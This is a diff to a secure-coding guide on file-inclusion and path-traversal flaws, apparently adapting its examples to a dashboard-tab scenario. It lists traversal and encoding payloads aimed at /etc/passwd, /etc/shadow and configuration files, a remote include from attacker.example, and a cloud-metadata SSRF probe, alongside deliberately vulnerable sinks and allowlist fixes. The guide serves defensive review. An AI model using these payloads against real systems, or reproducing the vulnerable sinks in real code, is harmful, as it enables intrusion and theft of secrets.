@@ -37,49 +37,49 @@ Use these in authorized tests when a parameter selects which page or fragment is
 ### Pattern 1: Directory traversal via include path
 
 ```text
-PARAM=../../../WEB-INF/web.xml
-PARAM=....//....//etc/passwd
-PARAM=..%2f..%2f..%2fWEB-INF%2fweb.xml
+TAB=../../../WEB-INF/spring-security.xml
+TAB=....//....//etc/passwd
+TAB=..%2f..%2f..%2fWEB-INF%2fbeans.xml
 ```
 
 ### Pattern 2: Absolute path under web root
 
 ```text
-PARAM=/admin/dashboard.jsp
-PARAM=/WEB-INF/applicationContext.xml
-PARAM=/META-INF/context.xml
+TAB=/admin/reports.jsp
+TAB=/WEB-INF/applicationContext.xml
+TAB=/META-INF/context.xml
 ```
 
 ### Pattern 3: Alternate extension and backup files
 
 ```text
-PARAM=login.jsp.bak
-PARAM=config.properties
-PARAM=../../application.yml
+TAB=sidebar.jsp.bak
+TAB=datasource.properties
+TAB=../../application-prod.yml
 ```
 
 ### Pattern 4: Null byte and encoding tricks (legacy parsers)
 
 ```text
-PARAM=footer.jsp%00
-PARAM=..%252f..%252fadmin%252fsecret
-PARAM=..%c0%af..%c0%afetc/passwd
+TAB=chart.jsp%00
+TAB=..%252f..%252fadmin%252fusers
+TAB=..%c0%af..%c0%afetc/passwd
 ```
 
 ### Pattern 5: Remote / SSRF-style include (when url= is supported)
 
 ```text
-PARAM=https://attacker.example/evil.jsp
-url=file:///etc/passwd
+TAB=https://attacker.example/malicious.jsp
+url=file:///etc/shadow
 url=http://169.254.169.254/latest/meta-data/
 ```
 
 ### Pattern 6: Framework view-name injection
 
 ```text
-PARAM=redirect:/admin/users
-PARAM=..\\..\\windows\\win.ini
-view=error/../secret
+TAB=redirect:/admin/billing
+TAB=..\\..\\windows\\system32\\drivers\\etc\\hosts
+view=reports/../secrets
 ```
 
 ## Language-Specific Sinks and Dangerous APIs
@@ -140,18 +140,18 @@ from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
-@app.route("/partial")
-def partial():
-    # Attacker-controlled fragment name — may contain ../ sequences
-    fragment = request.args.get("tpl", "default")
+@app.route("/dashboard/panel")
+def dashboard_panel():
+    # Attacker-controlled tab name — may contain ../ sequences
+    tab = request.args.get("tab", "overview")
     # Sink: user input selects template file path
-    return render_template(f"partials/{fragment}.html")
+    return render_template(f"dashboard/{tab}.html")
 ```
 
 ## Step-by-Step Review Walkthrough
 
 1. **Search for param-driven includes.** Find `<jsp:include page="${param.page}"/>`, dynamic view names, and `render_template` with user path segments.
-2. **Trace the Python (or equivalent) input path.** In the sample, `tpl` flows into an f-string template path. Ask whether `../admin/settings` resolves outside `partials/`.
+2. **Trace the Python (or equivalent) input path.** In the sample, `tab` flows into an f-string template path. Ask whether `../admin/settings` resolves outside `dashboard/`.
 3. **Review MVC controllers.** Flag `return "widgets/" + view` and similar patterns where the return value is a view name from the client.
 4. **Check path concatenation.** `"pages/" + name + ".jsp"`, `forward("/views/" + page)`, and OS-specific separators need normalization before comparison.
 5. **Verify allowlisting.** Map known keys to fixed paths. Reject unknown keys with 400 instead of probing the filesystem.
@@ -174,28 +174,28 @@ def partial():
 
 ```jsp
 <%@ page contentType="text/html;charset=UTF-8" %>
-<jsp:include page="pages/${param.page}.jsp"/>
+<jsp:include page="dashboard/${param.tab}.jsp"/>
 ```
 
 ```java
-@GetMapping("/widget")
-public String widget(@RequestParam String view, Model model) {
-    model.addAttribute("data", loadData());
-    return "widgets/" + view; // user supplies ../admin/settings
+@GetMapping("/dashboard/panel")
+public String panel(@RequestParam String tab, Model model) {
+    model.addAttribute("metrics", loadMetrics());
+    return "dashboard/" + tab; // user supplies ../admin/billing
 }
 ```
 
 ### C#
 
 ```csharp
-public IActionResult LoadPartial(string name)
+public IActionResult LoadDashboardTab(string tab)
 {
-    return PartialView($"~/Views/Shared/{name}.cshtml");
+    return PartialView($"~/Views/Dashboard/{tab}.cshtml");
 }
 
-public IActionResult Dashboard(string tab)
+public IActionResult Analytics(string chart)
 {
-    return View($"Dashboard/{tab}"); // tab = "../../Web.config"
+    return View($"Analytics/{chart}"); // chart = "../../Web.config"
 }
 ```
 
@@ -221,18 +221,18 @@ public IActionResult Dashboard(string tab)
 Map known keys to fixed template paths. Never pass raw user path segments to `render_template`.
 
 ```python
-PARTIALS = {
-    "profile": "partials/profile.html",
-    "nav": "partials/nav.html",
-    "default": "partials/default.html",
+DASHBOARD_TABS = {
+    "overview": "dashboard/overview.html",
+    "billing": "dashboard/billing.html",
+    "usage": "dashboard/usage.html",
 }
 
-@app.route("/partial")
-def partial():
-    key = request.args.get("tpl", "default")
-    template_name = PARTIALS.get(key)
+@app.route("/dashboard/panel")
+def dashboard_panel():
+    key = request.args.get("tab", "overview")
+    template_name = DASHBOARD_TABS.get(key)
     if template_name is None:
-        return "Unknown partial", 400
+        return "Unknown tab", 400
     return render_template(template_name)
 ```
 
@@ -255,18 +255,19 @@ def asset():
 Map known keys to fixed JSP paths. Never return raw user strings as view names.
 
 ```java
-private static final Map<String, String> WIDGETS = Map.of(
-    "summary", "widgets/summary",
-    "chart", "widgets/chart"
+private static final Map<String, String> DASHBOARD_TABS = Map.of(
+    "overview", "dashboard/overview",
+    "billing", "dashboard/billing",
+    "usage", "dashboard/usage"
 );
 
-@GetMapping("/widget")
-public String widget(@RequestParam String view, Model model) {
-    String viewName = WIDGETS.get(view);
+@GetMapping("/dashboard/panel")
+public String panel(@RequestParam String tab, Model model) {
+    String viewName = DASHBOARD_TABS.get(tab);
     if (viewName == null) {
         throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
     }
-    model.addAttribute("data", loadData());
+    model.addAttribute("metrics", loadMetrics());
     return viewName;
 }
 ```
@@ -286,16 +287,16 @@ if (!resolved.startsWith(base)) {
 Use enum-driven partials instead of string view names from the client.
 
 ```csharp
-public enum PartialKind { Nav, Footer, Sidebar }
+public enum DashboardTab { Overview, Billing, Usage }
 
-public IActionResult LoadPartial(PartialKind kind)
+public IActionResult LoadTab(DashboardTab tab)
 {
-    var viewName = kind switch
+    var viewName = tab switch
     {
-        PartialKind.Nav => "_Nav",
-        PartialKind.Footer => "_Footer",
-        PartialKind.Sidebar => "_Sidebar",
-        _ => throw new ArgumentOutOfRangeException(nameof(kind))
+        DashboardTab.Overview => "_Overview",
+        DashboardTab.Billing => "_Billing",
+        DashboardTab.Usage => "_Usage",
+        _ => throw new ArgumentOutOfRangeException(nameof(tab))
     };
     return PartialView(viewName);
 }
@@ -314,25 +315,26 @@ if (!fullPath.StartsWith(_viewsRoot, StringComparison.Ordinal))
 Parse templates at startup from a fixed set. Allowlist lookup for runtime selection.
 
 ```go
-//go:embed templates/partials/*
-var partialsFS embed.FS
+//go:embed templates/dashboard/*
+var dashboardFS embed.FS
 
-var partialTemplates = template.Must(
-    template.ParseFS(partialsFS, "templates/partials/*.html"))
+var dashboardTemplates = template.Must(
+    template.ParseFS(dashboardFS, "templates/dashboard/*.html"))
 
-var partialNames = map[string]string{
-    "nav":  "nav.html",
-    "footer": "footer.html",
+var dashboardTabs = map[string]string{
+    "overview": "overview.html",
+    "billing":  "billing.html",
+    "usage":    "usage.html",
 }
 
-func renderPartial(w http.ResponseWriter, r *http.Request) {
-    key := r.URL.Query().Get("partial")
-    file, ok := partialNames[key]
+func renderDashboardTab(w http.ResponseWriter, r *http.Request) {
+    key := r.URL.Query().Get("tab")
+    file, ok := dashboardTabs[key]
     if !ok {
-        http.Error(w, "unknown partial", http.StatusBadRequest)
+        http.Error(w, "unknown tab", http.StatusBadRequest)
         return
     }
-    partialTemplates.ExecuteTemplate(w, file, nil)
+    dashboardTemplates.ExecuteTemplate(w, file, nil)
 }
 ```
 
